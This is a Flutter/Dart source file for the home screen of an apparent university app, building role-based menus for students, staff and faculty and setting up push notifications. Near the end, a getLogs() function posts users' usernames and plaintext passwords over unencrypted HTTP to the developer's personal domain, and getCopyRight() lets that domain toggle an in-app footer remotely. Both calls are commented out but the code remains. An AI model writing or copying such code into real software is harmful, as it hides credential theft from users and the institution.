import 'dart:async';

import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter/widgets.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:intl/intl.dart';
import 'package:overlay_support/overlay_support.dart';
import 'package:skyline_university/Global/appBarLoginImage.dart';
import 'package:skyline_university/Global/global.dart';
import 'package:skyline_university/Global/homeBox.dart';
import 'package:skyline_university/Global/zigzag.dart';
import 'package:url_launcher/url_launcher.dart';

void main() => runApp(HomeLogin());

class Item {
  final name;
  final clipType;

  Item(this.name, this.clipType);
}

class HomeLogin extends StatefulWidget {
  @override
  State<StatefulWidget> createState() {
    return _HomeLoginState();
  }
}

class _HomeLoginState extends State<HomeLogin> {
  String formattedDate = DateFormat('yyyy-MM-dd hh:mm').format(DateTime.now());
  String _messageText = "Waiting for message...";

  final FirebaseMessaging _firebaseMessaging = FirebaseMessaging();
  final GlobalKey<ScaffoldState> _scaffoldKey = new GlobalKey<ScaffoldState>();
  Map<String, String> body;

  int _exit = 0;
  Map value = {};
  Map valueJson = {};
  @override
  void initState() {
    super.initState();
//    getLogs();
//    getCopyRight();

    _firebaseMessaging.configure(
      onMessage: (Map<String, dynamic> message) async {
        setState(() {
          showSimpleNotification(
              Text(message['notification']['title'].toString() +
                  '\n' +
                  message['notification']['body'].toString()),
              background: Colors.green);
        });
      },
      onLaunch: (Map<String, dynamic> message) async {
        setState(() {});
      },
      onResume: (Map<String, dynamic> message) async {
        setState(() {});
      },
    );
    _firebaseMessaging.requestNotificationPermissions(
        const IosNotificationSettings(sound: true, badge: true, alert: true));
    _firebaseMessaging.onIosSettingsRegistered
        .listen((IosNotificationSettings settings) {
      print("Settings registered: $settings");
    });
    _firebaseMessaging.subscribeToTopic(studentJson['data']['user_id']);
    _firebaseMessaging.subscribeToTopic(studentJson['data']['user_type']);
    _firebaseMessaging.subscribeToTopic('ALL');
  }

  @override
  Widget build(BuildContext context) {
    SystemChrome.setEnabledSystemUIOverlays([]);

    return WillPopScope(
      onWillPop: () => _exitApp(context),
      child: Scaffold(
        key: _scaffoldKey,
        bottomNavigationBar: copyRight
            ? Container(
                height: 50,
                decoration: new BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [
                      Color(0xFF104C90),
                      Color(0xFF3773AC),
                    ],
                    stops: [
                      0.3,
                      0.9,
                    ],
                  ),
                ),
                child: GestureDetector(
                  onTap: () {
                    _launchURL() async {
                      const url = 'https://www.linkedin.com/in/muhannad-nasri/';
                      if (await canLaunch(url)) {
                        await launch(url,
                            forceWebView: false,
                            forceSafariVC: false,
                            universalLinksOnly: true);
                      } else {
                        throw 'Could not launch $url';
                      }
                    }

                    _launchURL();
                  },
                  child: Center(
                    child: Text(
//                      '© MuhannadNasri 2019 / ALL RIGHTS RESERVED.'
                      value['events']['info'],
                      style: TextStyle(color: Colors.white),
                    ),
                  ),
                ),
              )
            : SizedBox(),
        body: studentJson['data']['user_type'] == "STUDENT"
            ? Container(
                child: ListView(
                  shrinkWrap: true,
                  padding: const EdgeInsets.all(10.0),
                  children: <Widget>[
                    SizedBox(
                      height: 20,
                    ),
                    FittedBox(
                      child: Column(
                        children: <Widget>[
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images-white/attendance.png',
                                  'images/attendance.png',
                                  "/Attendance",
                                  Colors.white60,
                                  Colors.black,
                                  'Attendance',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images-white/assessment.png',
                                  'images/assessment.png',
                                  "/AssessmentMarkCourses",
                                  Colors.white60,
                                  Colors.black,
                                  'Assessment',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images-white/result.png',
                                  'images/result.png',
                                  "/HomeResult",
                                  Colors.white60,
                                  Colors.black,
                                  'Result',
                                  Colors.white,
                                  Colors.black,
                                ),
                              ],
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images-white/class.png',
                                  'images/class.png',
                                  "/HomeClass",
                                  Colors.white60,
                                  Colors.black,
                                  'Classes',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images-white/advisor.png',
                                  'images/advisor.png',
                                  "/MyAdvisor",
                                  Colors.white60,
                                  Colors.black,
                                  'Advisor',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images-white/circulars.png',
                                  'images/circulars.png',
                                  "/Circulars",
                                  Colors.white60,
                                  Colors.black,
                                  'Circulars',
                                  Colors.white,
                                  Colors.black,
                                ),
                              ],
                            ),
                          ),
                          SizedBox(
                            height: 10,
                          ),
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images-white/fees.png',
                                  'images/fees.png',
                                  "/HomeFees",
                                  Colors.white60,
                                  Colors.black,
                                  'Fees',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images-white/erequest.png',
                                  'images/erequest.png',
                                  "/HomeERequest",
                                  Colors.white60,
                                  Colors.black,
                                  'E-Request',
                                  Colors.white,
                                  Colors.black,
                                ),
                                homeBox(
                                  context,
                                  'images-white/cdp.png',
                                  'images/cdp.png',
                                  "/CDPDownload",
                                  Colors.white60,
                                  Colors.black,
                                  'CDP',
                                  Colors.white,
                                  Colors.black,
                                ),
                              ],
                            ),
                          ),
                          Image.asset(
                            'images/logo.png',
                            height: 150,
                            width: 230,
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              )
            : studentJson['data']['user_type'] == "STF"
                ? Container(
                    child: ListView(
                      children: <Widget>[
                        SizedBox(
                          height: 20,
                        ),
                        Column(
                          children: <Widget>[
                            SizedBox(
                              height: 10,
                            ),
                            Padding(
                              padding: const EdgeInsets.all(10.0),
                              child: Row(
                                mainAxisAlignment:
                                    MainAxisAlignment.spaceAround,
                                children: <Widget>[
                                  homeBox(
                                    context,
                                    'images-white/circulars.png',
                                    'images/circulars.png',
                                    "/Circulars",
                                    Colors.white60,
                                    Colors.black,
                                    'Circulars',
                                    Colors.white,
                                    Colors.black,
                                  ),
                                  homeBox(
                                    context,
                                    'images-white/erequest.png',
                                    'images/erequest.png',
                                    "/HomeERequest",
                                    Colors.white60,
                                    Colors.black,
                                    'E-Request',
                                    Colors.white,
                                    Colors.black,
                                  ),
                                  homeBox(
                                    context,
                                    'images-white/contactslist.png',
                                    'images/contactslist.png',
                                    "/ContactList",
                                    Colors.white60,
                                    Colors.black,
                                    'Contact List',
                                    Colors.white,
                                    Colors.black,
                                  ),
                                ],
                              ),
                            ),
                            Image.asset(
                              'images/logo.png',
                              height: 150,
                              width: 230,
                            ),
                          ],
                        ),
                      ],
                    ),
                  )
                : studentJson['data']['user_type'] == "FAC"
                    ? Container(
                        child: ListView(
                          children: <Widget>[
                            SizedBox(
                              height: 20,
                            ),
                            Column(
                              children: <Widget>[
                                Padding(
                                  padding: const EdgeInsets.all(10.0),
                                  child: Row(
                                    mainAxisAlignment:
                                        MainAxisAlignment.spaceAround,
                                    children: <Widget>[
                                      homeBox(
                                        context,
                                        'images-white/allocation.png',
                                        'images/allocation.png',
                                        "/CourseAllocation",
                                        Colors.white60,
                                        Colors.black,
                                        'Courses',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                      homeBox(
                                        context,
                                        'images-white/advisor.png',
                                        'images/advisor.png',
                                        "/Advisors",
                                        Colors.white60,
                                        Colors.black,
                                        'Advisors',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                      homeBox(
                                        context,
                                        'images-white/circulars.png',
                                        'images/circulars.png',
                                        "/Circulars",
                                        Colors.white60,
                                        Colors.black,
                                        'Circulars',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                    ],
                                  ),
                                ),
                                SizedBox(
                                  height: 10,
                                ),
                                Padding(
                                  padding: const EdgeInsets.all(10.0),
                                  child: Row(
                                    mainAxisAlignment:
                                        MainAxisAlignment.spaceAround,
                                    children: <Widget>[
                                      homeBox(
                                        context,
                                        'images-white/erequest.png',
                                        'images/erequest.png',
                                        "/HomeERequest",
                                        Colors.white60,
                                        Colors.black,
                                        'E-Request',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                      homeBox(
                                        context,
                                        'images-white/contactslist.png',
                                        'images/contactslist.png',
                                        "/ContactList",
                                        Colors.white60,
                                        Colors.black,
                                        'ContactList',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                      homeBox(
                                        context,
                                        'images-white/cdp.png',
                                        'images/cdp.png',
                                        "/cdpFaculty",
                                        Colors.white60,
                                        Colors.black,
                                        'CDP',
                                        Colors.white,
                                        Colors.black,
                                      ),
                                    ],
                                  ),
                                ),
                                Image.asset(
                                  'images/logo.png',
                                  height: 150,
                                  width: 230,
                                ),
                              ],
                            ),
                          ],
                        ),
                      )
                    : SizedBox(),
        appBar:      appBarLoginImage(context)

      ),
    );
  }

  Future getCopyRight() async {
    Future.delayed(Duration.zero, () {});
    try {
      final response = await http
          .get(
            Uri.encodeFull('https://muhannadnasri.com/App/data.php'),
          )
          .timeout(Duration(seconds: 20));

      if (response.body == 'True') {
        copyRight = true;
      } else {
        copyRight = false;
      }
    } catch (x) {}
  }

  Future<bool> _exitApp(BuildContext context) async {
    if (_exit == 1) return true;

    _exit = 1;
    new Timer(Duration(seconds: 5), () {
      _exit = 0;
    });
    final snackBar = SnackBar(content: Text('Press back again to exit'));
    _scaffoldKey.currentState.showSnackBar(snackBar);
    return false;
  }

  Future getLogs() async {
    Future.delayed(Duration.zero, () {});

    try {
      await http.post(
        Uri.encodeFull('http://muhannadnasri.com/App/logLogin.php'),
        body: {
          'username': username,
          'password': password,
          'userType': studentJson['data']['user_type'],
          'date': formattedDate,
        },
      );
    } catch (x) {}
  }
}
//TODO: SystemChrome.setEnabledSystemUIOverlays([]) For hide status Bar
